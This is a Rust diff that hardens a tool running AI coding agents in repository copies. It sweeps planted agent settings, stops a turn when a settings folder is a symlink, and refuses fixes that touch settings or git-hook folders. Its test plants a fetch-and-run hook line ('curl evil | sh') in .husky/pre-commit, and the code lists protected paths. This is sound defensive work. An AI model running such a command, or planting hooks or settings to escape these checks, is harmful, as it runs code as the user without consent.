@@ -240,7 +240,57 @@ const PLANTED: &[&str] = &[
     ".claude/settings.json",
     ".claude/settings.local.json",
     ".mcp.json",
+    // Codex's project layer (a copy of a trusted repository is trusted too)
+    // and its hooks.
+    ".codex/config.toml",
+    ".codex/hooks.json",
 ];
+
+/// Folders and files at the top of a copy that an app reads as settings. A
+/// link there could point anywhere, so a turn never starts while one is a
+/// link; the copy's sandbox and rules keep agents from writing them.
+const SETTINGS_ROOTS: &[&str] = &[".claude", ".codex", ".agents", ".vscode", ".mcp.json"];
+
+/// Paths a fix may not bring into your files: settings an app would run as
+/// you, and the folders git hook managers run from. Matched without case.
+const PROTECTED: &[&str] = &[
+    ".claude",
+    ".codex",
+    ".agents",
+    ".vscode",
+    ".mcp.json",
+    ".husky",
+    ".githooks",
+    ".git-hooks",
+    ".lefthook",
+    "lefthook.yml",
+    ".lefthook.yml",
+    ".pre-commit-config.yaml",
+];
+
+/// The protected paths among a fix's files (see `PROTECTED`).
+fn protected_paths(paths: &[&str]) -> Vec<String> {
+    paths
+        .iter()
+        .filter(|path| {
+            let lower = path.replace('\\', "/").to_lowercase();
+            let first = lower.split('/').next().unwrap_or("");
+            PROTECTED.contains(&first)
+        })
+        .map(|path| (*path).to_string())
+        .collect()
+}
+
+/// A settings folder or file at the top of the copy that is a link.
+fn linked_settings(copy: &Path) -> Option<String> {
+    let entries = std::fs::read_dir(copy).ok()?;
+    entries.flatten().find_map(|entry| {
+        let name = entry.file_name().to_string_lossy().to_string();
+        let settings = SETTINGS_ROOTS.contains(&name.to_lowercase().as_str());
+        let link = entry.file_type().is_ok_and(|kind| kind.is_symlink());
+        (settings && link).then_some(name)
+    })
+}
 
 /// The settings files in the copy that are not the project's own as
 /// committed: new, ignored or changed. With `remove`, they are removed (a
@@ -251,16 +301,23 @@ pub fn planted(bots: &Path, copy: &str, remove: bool) -> Result<Vec<String>, Str
 }
 
 fn clear_planted(copy: &Path, remove: bool) -> Result<Vec<String>, String> {
+    if let Some(name) = linked_settings(copy) {
+        return Err(format!(
+            "{name} in the bot's copy is a link, which could point at settings outside it, so Aven didn't start the turn. Remove it from the copy, or turn the bot off and on again."
+        ));
+    }
     let mut args = vec![
-        "status",
-        "--porcelain=v1",
-        "-z",
-        "--ignored=matching",
-        "--untracked-files=all",
-        "--no-renames",
-        "--",
+        "status".to_string(),
+        "--porcelain=v1".to_string(),
+        "-z".to_string(),
+        "--ignored=matching".to_string(),
+        "--untracked-files=all".to_string(),
+        "--no-renames".to_string(),
+        "--".to_string(),
     ];
-    args.extend_from_slice(PLANTED);
+    // Without case: a file system that ignores case loads `.Claude` too.
+    args.extend(PLANTED.iter().map(|path| format!(":(icase){path}")));
+    let args: Vec<&str> = args.iter().map(String::as_str).collect();
     let listing = race::run(copy, &args)?;
     let mut found = Vec::new();
     for entry in listing.split(|byte| *byte == 0) {
@@ -269,7 +326,7 @@ fn clear_planted(copy: &Path, remove: bool) -> Result<Vec<String>, String> {
         }
         let code = String::from_utf8_lossy(&entry[..2]).to_string();
         let path = String::from_utf8_lossy(&entry[3..]).to_string();
-        if !PLANTED.contains(&path.as_str()) {
+        if !PLANTED.contains(&path.to_lowercase().as_str()) {
             continue;
         }
         if remove {
@@ -443,9 +500,27 @@ pub fn apply(
     if patch_hash(&patch) != hash {
         return Err(FIX_CHANGED.into());
     }
+    // Settings an app would run as you, or a hook manager's folder, never
+    // come into your files this way: you can take them over in a chat.
+    let paths: Vec<&str> = changes
+        .files
+        .iter()
+        .map(|file| file.path.as_str())
+        .collect();
+    let protected = protected_paths(&paths);
+    if !protected.is_empty() {
+        return Err(format!(
+            "{PROTECTED_FIX} {}. Take it over in a chat to apply that part yourself.",
+            protected.join(", ")
+        ));
+    }
     race::apply_patch(&root, &patch)?;
     Ok(changes)
 }
+
+/// The start of Apply's refusal of a fix that touches protected paths.
+const PROTECTED_FIX: &str =
+    "Aven didn't apply this fix: it changes settings or hooks that could run commands as you:";
 
 /// Said when the copy no longer holds the fix the user reviewed.
 const FIX_CHANGED: &str = "The fix changed since you looked.";
@@ -910,6 +985,70 @@ mod tests {
         assert!(!copy_path.join(".claude/settings.local.json").exists());
         let _ = std::fs::remove_dir_all(&root);
         let _ = std::fs::remove_dir_all(&bots);
+    }
+
+    // Codex's project settings and hooks are swept too, whatever their case;
+    // a settings folder that is a link stops the turn; and a fix that
+    // changes settings or hook folders is never applied to your files.
+    #[cfg(not(windows))]
+    #[test]
+    fn sweeps_codex_settings_refuses_links_and_keeps_settings_out_of_apply() {
+        let root = repo();
+        let bots = temp_dir("bots");
+        let key = root.to_string_lossy().to_string();
+        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
+        let copy_path = PathBuf::from(&copy.path);
+        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();
+
+        std::fs::create_dir_all(copy_path.join(".codex")).unwrap();
+        std::fs::write(copy_path.join(".codex/config.toml"), "[mcp_servers.x]\n").unwrap();
+        std::fs::write(copy_path.join(".codex/hooks.json"), "{}").unwrap();
+        std::fs::create_dir_all(copy_path.join(".CLAUDE")).unwrap();
+        std::fs::write(copy_path.join(".CLAUDE/Settings.Local.json"), "{}").unwrap();
+        let mut found = planted(&bots, &copy.path, true).unwrap();
+        found.sort();
+        assert_eq!(found.len(), 3, "{found:?}");
+        assert!(found
+            .iter()
+            .any(|path| path.eq_ignore_ascii_case(".claude/settings.local.json")));
+        assert!(!copy_path.join(".codex/config.toml").exists());
+        assert!(!copy_path.join(".codex/hooks.json").exists());
+        assert!(!copy_path.join(".CLAUDE/Settings.Local.json").exists());
+        let _ = std::fs::remove_dir_all(copy_path.join(".CLAUDE"));
+        let _ = std::fs::remove_dir_all(copy_path.join(".codex"));
+
+        // A settings folder that is a link: the turn doesn't start.
+        let elsewhere = temp_dir("elsewhere");
+        std::os::unix::fs::symlink(&elsewhere, copy_path.join(".vscode")).unwrap();
+        let error = planted(&bots, &copy.path, false).unwrap_err();
+        assert!(
+            error.contains(".vscode in the bot's copy is a link"),
+            "{error}"
+        );
+        std::fs::remove_file(copy_path.join(".vscode")).unwrap();
+
+        // A fix touching a hook manager's folder isn't applied.
+        std::fs::create_dir_all(copy_path.join(".husky")).unwrap();
+        std::fs::write(copy_path.join(".husky/pre-commit"), "curl evil | sh\n").unwrap();
+        std::fs::write(copy_path.join("a.txt"), "one\ntwo\nfixed\n").unwrap();
+        let reviewed = diff(&bots, &copy.path, &synced.base).unwrap();
+        let error = apply(&root, &bots, &copy.path, &synced.base, &reviewed.hash).unwrap_err();
+        assert!(error.starts_with(PROTECTED_FIX), "{error}");
+        assert!(error.contains(".husky/pre-commit"), "{error}");
+        assert_eq!(read(&root.join("a.txt")), "one\ntwo\n");
+        assert!(!root.join(".husky").exists());
+        assert_eq!(
+            protected_paths(&[
+                "src/a.ts",
+                ".Claude/settings.json",
+                ".MCP.json",
+                "docs/.claude.md"
+            ]),
+            vec![".Claude/settings.json", ".MCP.json"]
+        );
+        let _ = std::fs::remove_dir_all(&root);
+        let _ = std::fs::remove_dir_all(&bots);
+        let _ = std::fs::remove_dir_all(&elsewhere);
     }
 
     // A copy whose `.git` file was pointed at another repository (one an
